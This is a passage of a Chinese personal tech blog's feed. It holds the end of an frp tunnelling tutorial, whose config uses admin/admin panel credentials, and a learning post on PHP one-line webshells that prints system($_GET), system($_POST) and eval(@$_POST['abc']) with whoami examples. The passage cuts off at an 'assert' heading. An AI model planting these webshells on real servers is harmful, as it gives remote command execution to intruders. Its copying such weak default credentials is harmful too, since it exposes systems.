&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;local_port&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-genconfig&quot;&gt;25565&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;remote_port&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-genconfig&quot;&gt;25565&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&#x2F;image-20250609145929603.png&quot; alt=&quot;image-20250609145929603&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;准备运行frp服务端&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&#x2F;image-20250609150121222.png&quot; alt=&quot;image-20250609150121222&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;如上图所示，先设置权限，然后再运行&lt;&#x2F;p&gt;
&lt;p&gt;之后给安全组添加端口（如果是阿里云的话）。点击“手动添加”，端口范围填写刚刚所填的三个端口（分三次添加），授权对象选择“0.0.0.0&#x2F;0”&lt;&#x2F;p&gt;
&lt;p&gt;接着运行frp客户端&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;frpc -c frpc.ini
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;运行成功后我们就可以通过内网穿透来进行连接客户端了。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt; ssh -p port user_name@server_addr
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;接下来就可以通过这种方法爽玩MC了，大概测试了一下，几乎几个小时也花不了一个g。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;dian-dui-dian-chuan-tou&quot;&gt;点对点穿透&lt;a class=&quot;zola-anchor&quot; href=&quot;#dian-dui-dian-chuan-tou&quot; aria-label=&quot;Anchor link for: dian-dui-dian-chuan-tou&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;学习到另外一个更方便，或许说更方便的能力，就是p2p点对点穿透&lt;&#x2F;p&gt;
&lt;p&gt;该网络拓扑如下：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.assets&#x2F;image-20250609210547745.png&quot; alt=&quot;image-20250609210547745&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;优点：仅少量占用服务器带宽，占用的带宽可忽略不计，传输大文件利器！自然打游戏可能也会更好，哈哈。&lt;&#x2F;p&gt;
&lt;p&gt;先在服务端frps.ini进行配置&lt;&#x2F;p&gt;
&lt;p&gt;加上两行：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; class=&quot;language-shell z-code&quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bind_udp_port = 7001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;kcp_bind_port = 7000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;接着在需要穿透的主机内网开启一个frpc客户端，将配置文件写入frpc.ini（客户端配置）&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;ini&quot; class=&quot;language-ini z-code&quot;&gt;&lt;code class=&quot;language-ini&quot; data-lang=&quot;ini&quot;&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 连接服务器配置
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-storage z-type z-genconfig&quot;&gt;[common]
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;server_addr&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;*&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;server_port&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-genconfig&quot;&gt;7000&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 开启控制面板
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;admin_addr&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-ip z-genconfig&quot;&gt;&lt;span class=&quot;z-constant z-other z-genconfig&quot;&gt;127.0.0.1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;admin_port&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-genconfig&quot;&gt;80&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 设置控制面板账号密码
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;admin_user&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; admin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;admin_pwd&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; admin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 设置需要穿透的名称，但是在服务器后台是看不到该连接的
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-storage z-type z-genconfig&quot;&gt;[Mstsc]
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 设置协议xtcp
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;type&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; xtcp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 设置密钥
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;sk&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; abcdefg
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 设置需要穿透的IP
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;local_ip&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-ip z-genconfig&quot;&gt;&lt;span class=&quot;z-constant z-other z-genconfig&quot;&gt;127.0.0.1&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-comment z-genconfig&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-genconfig&quot;&gt;# 设置需要穿透的端口
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-genconfig&quot;&gt;&lt;span class=&quot;z-meta z-param z-genconfig&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-genconfig&quot;&gt;local_port&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-genconfig&quot;&gt;=&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-numeric z-genconfig&quot;&gt;3389&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在另外一台控制端也配置好跟上面类似的配置，然后local_port修改一下，这样就可以连到localhost:3390了。&lt;&#x2F;p&gt;
&lt;p&gt;不过经过测试，实际上更慢一些，而且成功率似乎也不高，哈哈。&lt;&#x2F;p&gt;
&lt;p&gt;参考：https:&#x2F;&#x2F;gofrp.org&#x2F;zh-cn&#x2F;docs&#x2F;examples&#x2F;xtcp&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44761176&#x2F;article&#x2F;details&#x2F;138943009&quot;&gt;针对新手友好的frp内网穿透p2p教程（流量不走云服务器）&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>一句话木马</title>
		<published>2025-06-01T00:00:00+00:00</published>
		<updated>2025-06-09T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/yi-ju-hua-mu-ma-jian-dan-xue-xi/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/yi-ju-hua-mu-ma-jian-dan-xue-xi/</id>
		<content type="html">&lt;h3 id=&quot;yi-ju-hua-mu-ma&quot;&gt;一句话木马&lt;a class=&quot;zola-anchor&quot; href=&quot;#yi-ju-hua-mu-ma&quot; aria-label=&quot;Anchor link for: yi-ju-hua-mu-ma&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;一句木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。黑客多在注册信息的电子邮箱或者个人主页等中运行该木马。&lt;&#x2F;p&gt;
&lt;p&gt;顾名思义是执行恶意指令的木马，通过技术手段上传到指定服务器上并可以正常访问。&lt;&#x2F;p&gt;
&lt;p&gt;举一个小栗子：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt; &lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-exec z-php&quot;&gt;system&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_GET&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以通过URL参数执行系统命令&lt;&#x2F;p&gt;
&lt;p&gt;http:&#x2F;&#x2F;localhost:3000&#x2F;hit.php?a=whoami&lt;&#x2F;p&gt;
&lt;p&gt;比如传入whoami查看当前用户&lt;&#x2F;p&gt;
&lt;p&gt;还有ipconfig&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0.assets&#x2F;image-20250609225843148.png&quot; alt=&quot;image-20250609225843148&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;再换成post,使用hackbar&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt; &lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-exec z-php&quot;&gt;system&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0.assets&#x2F;image-20250609230351762.png&quot; alt=&quot;image-20250609230351762&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;看下面的代码，这个是php一句话木马的代码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-line z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt; &lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-construct z-php&quot;&gt;eval&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;abc&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这段PHP代码的功能是执行通过POST请求传递过来的参数，我用post提交什么，服务器执行什么，也是说把这个代码上传上去之后，我让你服务器干啥干啥，甚至我让你服务器删除所有文件都会删除&lt;&#x2F;p&gt;
&lt;p&gt;具体来说，&lt;code&gt;eval(@$_POST[&#x27;abc&#x27;]);&lt;&#x2F;code&gt; 原理是&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval()&lt;&#x2F;code&gt; 是PHP的一个内置函数，用于执行字符串作为PHP代码。&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;@&lt;&#x2F;code&gt; 是一个操作符，用于抑制可能的错误消息。在这里，它抑制了&lt;code&gt;$_POST[&#x27;a&#x27;]&lt;&#x2F;code&gt;可能引发的错误（例如，如果&lt;code&gt;$_POST[&#x27;a&#x27;]&lt;&#x2F;code&gt;不存在或者不是有效的代码字符串）。&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;$_POST[&#x27;a&#x27;]&lt;&#x2F;code&gt; 是一个从HTTP POST请求中获取的变量。它应该是一个字符串，该字符串包含要执行的PHP代码。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;qi-ta-han-shu&quot;&gt;其他函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#qi-ta-han-shu&quot; aria-label=&quot;Anchor link for: qi-ta-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;assert&quot;&gt;&lt;code&gt;assert&lt;&#x2F;code&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#assert&quot; aria-label=&quot;Anchor link for: assert&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
